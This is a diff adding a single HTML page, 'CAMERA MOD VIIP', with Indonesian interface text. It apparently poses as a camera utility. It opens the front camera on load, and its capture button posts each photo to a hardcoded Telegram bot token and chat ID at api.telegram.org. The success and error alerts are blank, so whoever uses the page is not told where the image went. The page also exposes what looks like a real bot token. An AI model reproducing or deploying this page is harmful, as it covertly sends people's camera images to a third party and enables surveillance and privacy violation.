@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CAMERA MOD VIIP </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ff8240;
+            color: purple; /* Warna diperbaiki */
+            text-align: center;
+            padding: 20px;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        canvas {
+            display: none;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>CAMERA MOD VIIP</h1>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <br>
+    <button id="captureButton">Tangkap Gambar</button>
+    <button id="toggleCamera">Ganti Kamera</button>
+</body>
+<script>
+    const botToken = "7282994918:AAFL05t2mFv5KumNABKuWccpK5d1-Uzc96U"; // Masukkan token bot Telegram Anda
+    const chatId = "5951232585"; // Masukkan chat ID penerima
+
+    let currentStream = null;
+    let usingFrontCamera = true; // Default kamera depan
+    const videoElement = document.getElementById('video');
+    const canvasElement = document.getElementById('canvas');
+    const captureButton = document.getElementById('captureButton');
+    const toggleCameraButton = document.getElementById('toggleCamera');
+
+    async function startCamera(front = true) {
+        if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+        }
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: front ? "user" : "environment" }
+            });
+            videoElement.srcObject = currentStream;
+        } catch (error) {
+            alert("Tidak dapat mengakses kamera: " + error.message);
+        }
+    }
+
+    async function captureImage() {
+        const context = canvasElement.getContext('2d');
+        canvasElement.width = videoElement.videoWidth;
+        canvasElement.height = videoElement.videoHeight;
+        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+        const imageData = canvasElement.toDataURL('image/png');
+        await sendToTelegram(imageData);
+    }
+
+    async function sendToTelegram(imageData) {
+        const blob = await (await fetch(imageData)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'image.png');
+
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData,
+            });
+            if (response.ok) {
+                alert('');
+            } else {
+                alert('.');
+            }
+        } catch (error) {
+            alert('.');
+        }
+    }
+
+    captureButton.addEventListener('click', captureImage);
+    toggleCameraButton.addEventListener('click', () => {
+        usingFrontCamera = !usingFrontCamera;
+        startCamera(usingFrontCamera);
+    });
+
+    startCamera();
+</script>
+</html>
